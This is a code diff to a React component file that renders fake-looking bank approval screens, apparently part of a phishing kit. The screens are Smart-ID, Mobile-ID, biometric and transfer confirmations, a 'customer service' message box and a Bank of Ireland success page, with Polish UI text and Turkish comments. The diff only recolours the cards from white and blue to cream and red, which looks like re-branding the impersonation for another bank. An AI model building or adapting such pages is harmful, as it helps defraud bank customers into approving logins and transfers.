@@ -127,7 +127,7 @@ function SmartIdApprovalCard({
 }) {
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[352px] rounded-[18px] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)] sm:px-7">
+      <div className="w-full max-w-[352px] rounded-[18px] bg-[#fff6ec] px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)] sm:px-7">
         <div className="mb-9 flex justify-center">
           <SmartIdMark />
         </div>
@@ -176,8 +176,8 @@ function GenericApprovalCard({
 }) {
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
-        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#00539f]">{title}</p>
+      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-[#fff6ec] p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
+        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#dd1a21]">{title}</p>
         <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Wymagane potwierdzenie</h1>
         <p className="mb-6 text-base text-[#667085]">Aby kontynuować, potwierdź kod weryfikacyjny wyświetlony na Twoim urządzeniu.</p>
 
@@ -217,7 +217,7 @@ function MobileIdApprovalCard({
 }) {
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+      <div className="w-full max-w-[354px] rounded-[18px] bg-[#fff6ec] px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
         <div className="mb-9 flex justify-center">
           <MobileIdMark />
         </div>
@@ -272,7 +272,7 @@ function BiometricApprovalCard({
 
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+      <div className="w-full max-w-[354px] rounded-[18px] bg-[#fff6ec] px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
         <div className="mb-9 flex min-h-[48px] items-center justify-center">
           {bankLogo ? (
             <img
@@ -338,7 +338,7 @@ function TransferApprovalCard({
 
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4e2f0] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4e2f0] bg-[#fff6ec] px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
         {/* Marka sol ust + banka logosu sag ust */}
         <div className="mb-6 flex items-start justify-between">
           <img
@@ -376,7 +376,7 @@ function TransferApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#00539f] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[var(--brand)] disabled:cursor-not-allowed disabled:opacity-70"
+          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#dd1a21] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[var(--brand)] disabled:cursor-not-allowed disabled:opacity-70"
         >
           <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
@@ -391,17 +391,17 @@ function TransferApprovalCard({
 function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] border border-[#dbe6f3] bg-white p-6 text-center shadow-[0_20px_60px_rgba(10,36,99,0.15)] sm:p-10">
+      <div className="w-full max-w-[650px] rounded-[24px] border border-[#f2d8c4] bg-[#fff6ec] p-6 text-center shadow-[0_20px_60px_rgba(107,10,10,0.15)] sm:p-10">
         <div className="mb-4">
           <p className="text-xs font-bold uppercase tracking-widest text-[var(--brand-dark)]">Obsługa klienta</p>
         </div>
 
-        <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-[#0a2463]">
+        <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-[#6b0a0a]">
           <Linkify text={message} />
         </p>
 
         {imageUrl ? (
-          <div className="mt-4 overflow-hidden rounded-2xl border border-[#dbe6f3] bg-[#f8fafd] p-1 shadow-sm">
+          <div className="mt-4 overflow-hidden rounded-2xl border border-[#f2d8c4] bg-[#fdf2e4] p-1 shadow-sm">
             <img src={imageUrl} alt="Support" className="mx-auto h-auto w-full rounded-xl object-contain" />
           </div>
         ) : null}
@@ -612,7 +612,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           <div className="relative z-10 mb-6 sm:mb-8 flex justify-center">
             <img src="/bank-logos/boi_logo.svg" alt="Bank of Ireland" className="h-8 sm:h-9 w-auto drop-shadow-md" />
           </div>
-          <div className="relative z-10 w-full max-w-[380px] rounded-[18px] bg-white px-7 py-10 text-center shadow-2xl">
+          <div className="relative z-10 w-full max-w-[380px] rounded-[18px] bg-[#fff6ec] px-7 py-10 text-center shadow-2xl">
             <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
               <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
@@ -627,7 +627,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     }
     return (
       <div className="flex min-h-screen items-center justify-center px-4 py-8">
-        <div className="w-full max-w-[360px] rounded-[22px] border border-[#d9dee6] bg-white px-7 py-10 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
+        <div className="w-full max-w-[360px] rounded-[22px] border border-[#d9dee6] bg-[#fff6ec] px-7 py-10 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
           <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
             <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
               <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
